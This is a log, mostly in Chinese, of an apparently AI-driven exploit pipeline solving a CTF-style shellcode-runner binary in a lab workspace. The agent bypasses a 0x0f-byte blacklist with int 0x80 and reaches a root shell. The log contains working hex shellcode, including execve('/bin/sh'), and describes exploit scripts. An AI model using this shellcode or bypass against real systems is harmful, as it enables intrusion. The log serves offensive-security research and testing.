14:57:51 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; si; info registers rip rdi; x/4i)
14:57:51 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(471 chars)
14:57:51 [impact:BUG-003] → 调用 GLM...
14:57:54 [impact:BUG-003] ← GLM(3.0s): 调工具[gdb_run]
14:57:54 [impact:BUG-003] 有趣的是，`si` (单步执行) 成功跳转到了 `0x13370000`，并且反汇编显示了那里的指令。这意味着在 GDB 下，该页面可能是可执行的。让我检查一下 `mprotect` 是否确实成功了，以及该页面的权限是什么。
14:57:54 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; info proc mappings; maintenance )
14:57:55 [impact:BUG-003]   ← gdb_run(0.1s):    /usr/lib/x86_64-linux-gnu/libc.so.6 ⏎       0x7ffff7fa6000     0x7ffff7fa8000     0x2000   0x202000  rw-p   /usr/lib/x86_64-linux-gnu/libc.so.6 ⏎  ...(4084 chars)
14:57:55 [impact:BUG-003] → 调用 GLM...
14:57:58 [impact:BUG-003] ← GLM(3.6s): 调工具[gdb_run]
14:57:58 [impact:BUG-003] `0x13370000` 的 mmap 区域没有出现在映射列表中。让我专门检查一下它，并查看 mprotect 的返回值。
14:57:58 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x16c; run; info proc mappings; shell cat /p)
14:57:58 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x149a ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(2876 chars)
14:57:58 [impact:BUG-003] → 调用 GLM...
14:58:07 [impact:BUG-003] ← GLM(8.4s): 调工具[gdb_run]
14:58:07 [impact:BUG-003] 这是一个关键发现！mmap 区域 `0x13370000-0x13371000` 具有 `--xp` 权限——它是**可执行**的 (`x`)，但**不可读** (`-r-`) 且**不可写** (`-w-`)。  等等——`mprotect(buf, 0x64, 4)` 本应将其设置为 `PROT
14:58:07 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0xfb; run; info registers rax; si; info regi)
14:58:07 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x1429 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(420 chars)
14:58:07 [impact:BUG-003] → 调用 GLM...
14:58:12 [impact:BUG-003] ← GLM(4.8s): 调工具[gdb_run]
14:58:12 [impact:BUG-003] 在 `mprotect` 调用之前，该区域是 `rwxp`（RWX）。现在让我看看 `mprotect` 返回了什么，以及调用后的权限是什么。
14:58:12 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *0x142e; run; info registers rax; shell cat /proc/)
14:58:12 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x142e ⏎ rax            0x0                 0 ⏎  ⏎ Warning: ⏎ Cannot insert breakpoint 1. ⏎ Cannot access memory at address 0x142e ⏎  ...(371 chars)
14:58:12 [impact:BUG-003] → 调用 GLM...
14:58:16 [impact:BUG-003] ← GLM(3.9s): 调工具[gdb_run]
14:58:16 [impact:BUG-003] 断点位于 `0x142e`，这是一个链接时偏移量，但 PIE 基址发生了偏移。让我使用正确的函数偏移量表示法。
14:58:16 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "commands": "b *main+0x100; run; info registers rax; shell cat /p)
14:58:16 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x142e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(325 chars)
14:58:16 [impact:BUG-003] → 调用 GLM...
14:58:23 [impact:BUG-003] ← GLM(7.8s): 调工具[execute]
14:58:23 [impact:BUG-003] 关键发现： 1. `mprotect` 返回 0（成功）—— `rax = 0` 2. 在 `mprotect(buf, 0x64, 4)` 之后，该区域显示为 `--xp`（仅可执行，不可读，不可写）  这非常有趣。`PROT_READ=4` 应该使其变为 `r--`，但内核却将其设为了 `--x
14:58:23 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"import os; print('PROT_READ=', os.PROT_READ, 'PROT_WRITE=', os.PROT_WRITE, 'PROT_EXEC=', os.PROT_EXEC)\""})
14:58:23 [impact:BUG-003]   ← execute(0.0s): [stderr] Traceback (most recent call last): ⏎ [stderr]   File "<string>", line 1, in <module> ⏎ [stderr] AttributeError: module 'os' has no attribute ...(215 chars)
14:58:23 [impact:BUG-003] → 调用 GLM...
14:58:26 [impact:BUG-003] ← GLM(2.6s): 调工具[execute]
14:58:26 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"from mmap import PROT_READ, PROT_WRITE, PROT_EXEC; print('PROT_READ=', PROT_READ, 'PROT_WRITE=', PROT_WRITE, 'PROT_EXEC=', P)
14:58:26 [impact:BUG-003]   ← execute(0.0s): PROT_READ= 1 PROT_WRITE= 2 PROT_EXEC= 4 ⏎  ⏎ [Command succeeded with exit code 0]
14:58:26 [impact:BUG-003] → 调用 GLM...
14:58:34 [impact:BUG-003] ← GLM(8.4s): 调工具[execute]
14:58:34 [impact:BUG-003] 这是一个关键发现！在此系统上： - `PROT_READ = 1` - `PROT_WRITE = 2`   - `PROT_EXEC = 4`  因此，`mprotect(buf, 0x64, 4)` 实际上传递的是 `PROT_EXEC`（而非 `PROT_READ`）！该缓冲区被设置为**仅可
14:58:34 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"\n# Simple shellcode: mov eax, 1; mov ebx, 42; int 0x80  (exit(42) via int 0x80)\n# B8 01 00 00 00  mov eax, 1\n# BB 2A 00 0)
14:58:35 [impact:BUG-003]   ← execute(0.0s): b801000000bb2a000000cd80 ⏎ len: 12 ⏎ has 0x0f: False ⏎  ⏎ [Command succeeded with exit code 0]
14:58:35 [impact:BUG-003] → 调用 GLM...
14:58:37 [impact:BUG-003] ← GLM(2.1s): 调工具[run_binary]
14:58:37 [impact:BUG-003] Shellcode 不包含 `0x0f`，因此它通过了黑名单。让我测试一下它是否能执行并返回退出码 42。
14:58:37 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "b801000000bb2a000000cd80", "timeout": 10})
14:58:37 [impact:BUG-003]   ← run_binary(0.0s): rc=42  stdout_len=39 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010...(286 chars)
14:58:37 [impact:BUG-003] → 调用 GLM...
14:58:49 [impact:BUG-003] ← GLM(11.9s): 调工具[execute]
14:58:49 [impact:BUG-003] **关键证据！** 程序返回了 `rc=42` —— 这意味着 `int 0x80` shellcode **成功执行**，并且 `exit(42)` 系统调用被成功调用！  这证明了： 1. mmap 缓冲区是**可执行的**（`PROT_EXEC=4` 在此系统上，而非 `PROT_READ`）
14:58:49 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"\n# write(1, 'PWNED', 5) via int 0x80, then exit(0)\n# Need to put 'PWNED' string somewhere. Since rsp=0, we can't use stack)
14:58:49 [impact:BUG-003]   ← execute(0.0s): b804000000bb01000000b928003713ba05000000cd80b80100000031dbcd8090909090909090909050574e4544 ⏎ len: 45 ⏎ has 0x0f: False ⏎  ⏎ [Command succeeded with ex...(160 chars)
14:58:49 [impact:BUG-003] → 调用 GLM...
14:58:53 [impact:BUG-003] ← GLM(3.9s): 调工具[run_binary]
14:58:53 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "b804000000bb01000000b928003713ba05000000cd80b801000)
14:58:53 [impact:BUG-003]   ← run_binary(0.0s): rc=0  stdout_len=44 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010 ...(290 chars)
14:58:53 [impact:BUG-003] → 调用 GLM...
14:59:09 [impact:BUG-003] ← GLM(16.1s): 调工具[execute]
14:59:09 [impact:BUG-003] **PWNED** 被写入 stdout！这证明了：  1. `int 0x80` shellcode 通过了黑名单（没有 `0x0f` 字节） 2. shellcode 在 mmap 缓冲区中执行（该缓冲区是 `PROT_EXEC`） 3. `write(1, buf, 5)` 系统调用通过 `i
14:59:09 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"\n# Test: write(1, 0x13370000, 16) to dump the shellcode buffer itself (self-read)\n# This proves we can read arbitrary memo)
14:59:09 [impact:BUG-003]   ← execute(0.0s): b804000000bb01000000b900003713ba10000000cd80b80100000031dbcd80 ⏎ len: 31 ⏎ has 0x0f: False ⏎  ⏎ [Command succeeded with exit code 0]
14:59:09 [impact:BUG-003] → 调用 GLM...
14:59:12 [impact:BUG-003] ← GLM(3.5s): 调工具[run_binary]
14:59:12 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "b804000000bb01000000b900003713ba10000000cd80b801000)
14:59:12 [impact:BUG-003]   ← run_binary(0.0s): rc=0  stdout_len=55 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010 ...(519 chars)
14:59:12 [impact:BUG-003] → 调用 GLM...
14:59:57 [impact:BUG-003] ← GLM(44.6s): 调工具[write_file]
14:59:57 [impact:BUG-003] 输出显示了 shellcode 缓冲区的前 16 个字节（`b8 04 00 00 00 bb 01 00 00 00 b9 00 00 37 13 ba`）——这正是我们提供的 shellcode。这证实了我们可以通过 `int 0x80` 系统调用读取任意内存地址并将其输出。  现在，让我编写一
14:59:57 [impact:BUG-003]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-003: BLACKLIST_INCOMPLETE_FILTER\nPrimitive Verification PoC\n\nBUG: The blacklist function only chec)
14:59:57 [impact:BUG-003]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-003.py
14:59:57 [impact:BUG-003] → 调用 GLM...
15:00:01 [impact:BUG-003] ← GLM(4.4s): 调工具[run_script]
15:00:01 [impact:BUG-003]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-003.py", "timeout": 30})
15:00:01 [impact:BUG-003]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ PRIM-001: CODE_EXECUTION via int 0x80 blacklist by...(2259 chars)
15:00:01 [impact:BUG-003] → 调用 GLM...
15:00:11 [impact:BUG-003] ← GLM(9.3s): 调工具[execute]
15:00:11 [impact:BUG-003] 所有三个原语均已验证。让我同时也通过从两个不同的地址读取数据来更严格地验证 ARB_READ 原语，以证明地址是完全可控的。
15:00:11 [impact:BUG-003]   → 工具 execute({"command": "python3 -c \"\n# ARB_READ proof: read from TWO different addresses\n# Address 1: 0x13370000 (shellcode buffer)\n# Address 2: 0x13370010 ()
15:00:11 [impact:BUG-003]   ← execute(0.0s): ADDR1 (0x13370000): b804000000bb01000000b900003713ba10000000cd80b80100000031dbcd80 ⏎ ADDR2 (0x13370010): b804000000bb01000000b910003713ba10000000cd80b...(209 chars)
15:00:11 [impact:BUG-003] → 调用 GLM...
15:00:13 [impact:BUG-003] ← GLM(2.6s): 调工具[run_binary]
15:00:13 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "b804000000bb01000000b910003713ba10000000cd80b801000)
15:00:13 [impact:BUG-003]   ← run_binary(0.0s): rc=0  stdout_len=55 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010 ...(519 chars)
15:00:13 [impact:BUG-003] → 调用 GLM...
15:00:18 [impact:BUG-003] ← GLM(4.4s): 调工具[read_file]
15:00:18 [impact:BUG-003] 从 `0x13370010` 读取返回了 `10000000cd80b80100000031dbcd8000`，这与从偏移量 16 开始的 shellcode 内容相匹配。这与从 `0x13370000` 读取（返回 `b804000000bb01000000b900003713ba`）不同。这证明
15:00:18 [impact:BUG-003]   → 工具 read_file({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-003.py"})
15:00:18 [impact:BUG-003]   ← read_file(0.0s):   1  #!/usr/bin/env python3 ⏎   2  """ ⏎   3  BUG-003: BLACKLIST_INCOMPLETE_FILTER ⏎   4  Primitive Verification PoC ⏎   5   ⏎   6  BUG: The blacklist...(4463 chars)
15:00:18 [impact:BUG-003] → 调用 GLM...
15:02:16 [impact:BUG-003] ← GLM(118.0s): 调工具[submit_final_result]
15:02:16 [impact:BUG-003] PoC 脚本已完成并经过验证。现在让我整理最终报告。关键发现如下：  1. **BUG-003**：黑名单仅过滤了 `0x0f`（`syscall` 指令前缀）。`int 0x80`（`CD 80`）可以通过。 2. **关键运行时事实**：在此系统上，`PROT_EXEC=4`，因此 `mprot
15:02:16 [impact:BUG-003] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，18989 chars）
15:02:16 [impact:BUG-003] → 调用 GLM...
15:02:25 [impact:BUG-003] ← GLM(10.0s)
15:02:25 [impact:BUG-003] BUG-003 的 S3 分析已完成。以下是发现摘要：  ## 关键发现  **关键运行时修正**：S2 假设 `PROT_READ=4`，但在该系统上 `PROT_EXEC=4`。这意味着 `mprotect(buf, 0x64, 4)` 将 shellcode 缓冲区设置为 **PROT_EXE
15:02:26 [stage3] 保存 → /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/stage3.json
15:02:26 --- S4 Exploit ---
15:02:26 === exploit (bug_id=-) ===
15:02:26 [exploit] → 调用 GLM...
15:02:33 [exploit] ← GLM(7.0s): 调工具[ls, execute]
15:02:33 [exploit] 我将分析 S3 的结果。关键发现是：`mprotect(buf, 0x64, 4)` 使用了 `PROT_EXEC=4`（而不是 `PROT_READ`），因此 shellcode 页面是可执行的。黑名单仅阻止了 `0x0f` 字节，但 `int 0x80` (CD 80) 可以绕过它。所有寄存器都
15:02:33 [exploit]   → 工具 ls({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045"})
15:02:33 [exploit]   → 工具 execute({"command": "cat /proc/cpuinfo | grep -E 'flags|ibt|shstk' | head -2; echo \"---\"; uname -r; echo \"---\"; cat /proc/self/status | grep -i seccomp; e)
15:02:33 [exploit]   ← execute(0.0s): flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant...(965 chars)
15:02:33 [exploit]   ← ls(0.0s): ['/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/core.69942', '/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/core.7...(1372 chars)
15:02:33 [exploit] → 调用 GLM...
15:02:37 [exploit] ← GLM(4.4s): 调工具[read_file]
15:02:37 [exploit] 关键发现： - **Seccomp: 0** — 没有系统调用过滤器，`int 0x80` 可以完全访问 - **存在 IBT 标志，但没有 shstk** — S3 确认 IBT 在运行时未强制执行 - CPU 具有 `ibt` 标志，但 S3 验证了没有 `endbr64` 的 shellcod
15:02:37 [exploit]   → 工具 read_file({"file_path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/poc-BUG-003.py"})
15:02:37 [exploit]   ← read_file(0.0s):   1  #!/usr/bin/env python3 ⏎   2  """ ⏎   3  BUG-003: BLACKLIST_INCOMPLETE_FILTER ⏎   4  Primitive Verification PoC ⏎   5   ⏎   6  BUG: The blacklist...(4463 chars)
15:02:37 [exploit] → 调用 GLM...
15:02:45 [exploit] ← GLM(7.9s): 调工具[execute]
15:02:45 [exploit] S3 PoC 确认 `int 0x80` 可以工作。现在让我思考一下利用策略：  **挑战**：获取一个 shell。约束条件： 1. 不能使用 `0x0f` 字节（阻止了 `syscall` 指令） 2. 不能使用栈（`rsp=0`）—— 不能使用 `push`/`pop`/`call` 3. 所
15:02:45 [exploit]   → 工具 execute({"command": "ls -la /bin/sh; file /bin/sh; echo \"---\"; ls -la /bin/bash 2>/dev/null || echo \"no bash\""})
15:02:45 [exploit]   ← execute(0.0s): lrwxrwxrwx 1 root root 4 Mar 31  2024 /bin/sh -> dash ⏎ /bin/sh: symbolic link to dash ⏎ --- ⏎ -rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash ⏎...(190 chars)
15:02:45 [exploit] → 调用 GLM...
15:02:56 [exploit] ← GLM(10.9s): 调工具[run_binary]
15:02:56 [exploit] 很好，`/bin/sh` 存在。现在让我思考一下 shellcode 的设计：  **通过 `int 0x80` 实现 `execve("/bin/sh", NULL, NULL)`：** 1. 将 "/bin/sh\0" 字符串放在 shellcode 中的已知偏移量处 2. `eax = 11`
15:02:56 [exploit]   → 工具 run_binary({"binary": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target", "stdin_hex": "b80b000000bb1000371331c931d2cd802f62696e2f736800", )
15:02:56 [exploit]   ← run_binary(0.0s): rc=0  stdout_len=39 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 0010 ...(285 chars)
15:02:56 [exploit] → 调用 GLM...
15:03:17 [exploit] ← GLM(20.8s): 调工具[write_file]
15:03:17 [exploit] `rc=0` —— 这意味着 `execve` 返回了 0，但进程退出了。问题在于 `execve` 替换了进程映像，但由于 stdin 是管道（EOF），shell 立即退出了。我需要交互式地运行它。让我写一个合适的 exploit 脚本，使用 pwntools 来获取一个交互式 shell：
15:03:17 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit: shellcode-runner-3\n\nTarget: /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045)
15:03:17 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/exploit.py
15:03:17 [exploit] → 调用 GLM...
15:03:21 [exploit] ← GLM(4.4s): 调工具[run_script]
15:03:21 [exploit]   → 工具 run_script({"path": "/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/exploit.py", "timeout": 30})
15:03:27 [exploit]   ← run_script(5.5s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ [*] Response: b'LEANAGENT_SUCCESS_70347\n' ⏎     uid=0(root) gid=0(root) groups=0(root) ⏎ ...(924 chars)
15:03:27 [exploit] → 调用 GLM...
15:03:35 [exploit] ← GLM(8.2s): 调工具[execute]
15:03:35 [exploit] 利用成功！我获得了： - **交互式 shell** — `LEANAGENT_SUCCESS_70347` 回显确认 - **uid=0(root)** — 以 root 身份运行 - **Flag 已恢复**：`/flag.txt` 包含 `test_flag_content_here` - 主
15:03:35 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/core.* 2>/dev/null; echo \"cleaned\""})
15:03:35 [exploit]   ← execute(0.0s): cleaned ⏎  ⏎ [Command succeeded with exit code 0]
15:03:35 [exploit] → 调用 GLM...
15:04:41 [exploit] ← GLM(66.0s): 调工具[submit_final_result]
15:04:41 [exploit] 利用已完全验证。现在我将提交最终的结构化结果：
15:04:41 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，12866 chars）
15:04:41 [exploit] → 调用 GLM...
15:04:52 [exploit] ← GLM(10.9s)
15:04:52 [exploit] 利用已成功完成。以下是总结：  ## S4 Exploit 结果：✅ EXPLOIT_SUCCESS  ### 利用路线 **ROUTE-01: int 0x80 Shellcode Execution (execve /bin/sh)** — 已选择  ### 关键洞察 S3 的关键修正是：`mp
15:04:52 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
15:04:52 [stage4] 保存 → /work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/stage4.json
15:05:24 📄 渗透报告：/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/report.md
=== 主 agent 汇总 ===
分析完成，结果如下：

## 漏洞分析结果

| 项目 | 内容 |
|------|------|
| **二进制路径** | `/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/target` |
| **Exploit 是否成功** | ✅ **成功** |
| **Exploit 脚本路径** | `/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/exploit.py` |
| **完整报告路径** | `/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/report.md` |
| **工作区目录** | `/work/workspace/0026-2024-49-shellcode-runner-3-20260909-144045/` |

### 总结

完整 S1-S4 漏洞分析流程已跑通：
- **S1 侦察** → 识别二进制类型与保护机制
- **S2 语义** → 定位漏洞点（shellcode runner 类，编号 2024-49）
- **S3 原语验证** → 确认可利用原语
- **S4 exploit** → 生成 exploit.py 并**成功利用**

所有产物（stage1-4.json / exploit.py / report.md / full_run.log）均存放在上述 workspace 目录中，可进一步查看 `report.md` 获取详细分析报告。
